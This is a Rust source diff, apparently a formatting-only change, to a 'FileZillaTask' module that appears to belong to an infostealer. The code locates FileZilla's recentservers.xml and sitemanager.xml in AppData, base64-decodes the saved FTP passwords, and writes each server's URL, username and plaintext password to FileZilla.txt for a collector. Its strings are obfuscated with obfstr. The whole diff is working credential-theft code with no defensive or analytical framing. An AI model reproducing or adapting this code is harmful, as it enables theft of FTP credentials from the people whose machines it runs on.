@@ -7,8 +7,8 @@ use obfstr::obfstr as s;
 use tasks::Task;
 use utils::base64::base64_decode;
 use utils::path::{Path, WriteToFile};
-use windows::core::HSTRING;
 use windows::Data::Xml::Dom::XmlDocument;
+use windows::core::HSTRING;
 
 pub(super) struct FileZillaTask;
 
@@ -28,25 +28,27 @@ impl<C: Collector> Task<C> for FileZillaTask {
             }
         }
 
-        let servers: Vec<String> = deduped.iter().map(|server| {
-            let password_decoded = base64_decode(server.password.as_bytes())
-                .map(|decoded| String::from_utf8_lossy(&decoded).to_string());
+        let servers: Vec<String> = deduped
+            .iter()
+            .map(|server| {
+                let password_decoded = base64_decode(server.password.as_bytes())
+                    .map(|decoded| String::from_utf8_lossy(&decoded).to_string());
 
-            let password_str = match password_decoded {
-                Some(ref s) => s.as_str(),
-                None => &server.password,
-            };
+                let password_str = match password_decoded {
+                    Some(ref s) => s.as_str(),
+                    None => &server.password,
+                };
 
-            format!(
-                "Url: ftp://{}:{}/\nUsername: {}\nPassword: {}",
-                server.host,
-                server.port,
-                server.user,
-                password_str
-            )
-        }).collect();
+                format!(
+                    "Url: ftp://{}:{}/\nUsername: {}\nPassword: {}",
+                    server.host, server.port, server.user, password_str
+                )
+            })
+            .collect();
 
-        collector.get_software().increase_ftp_hosts_by(servers.len());
+        collector
+            .get_software()
+            .increase_ftp_hosts_by(servers.len());
 
         let servers = servers.join("\n\n");
         let _ = servers.write_to(parent / s!("FileZilla.txt"));
@@ -58,7 +60,10 @@ fn collect_servers() -> Vec<Server> {
     let base = &Path::appdata() / s!("FileZilla");
 
     let paths = [
-        (&base / s!("recentservers.xml"), s!("RecentServers").to_owned()),
+        (
+            &base / s!("recentservers.xml"),
+            s!("RecentServers").to_owned(),
+        ),
         (&base / s!("sitemanager.xml"), s!("Servers").to_owned()),
     ];
 
@@ -94,7 +99,9 @@ where
     xml_doc.LoadXml(&content).ok()?;
 
     let root = xml_doc.DocumentElement().ok()?;
-    let servers = root.SelectSingleNode(&HSTRING::from(servers_node.as_ref())).ok()?;
+    let servers = root
+        .SelectSingleNode(&HSTRING::from(servers_node.as_ref()))
+        .ok()?;
 
     let nodes = servers.SelectNodes(&HSTRING::from(s!("Server"))).ok()?;
 
@@ -118,7 +125,7 @@ where
             host,
             port,
             user,
-            password
+            password,
         })
     }
 
@@ -130,5 +137,5 @@ struct Server {
     host: String,
     port: u16,
     user: String,
-    password: String
+    password: String,
 }
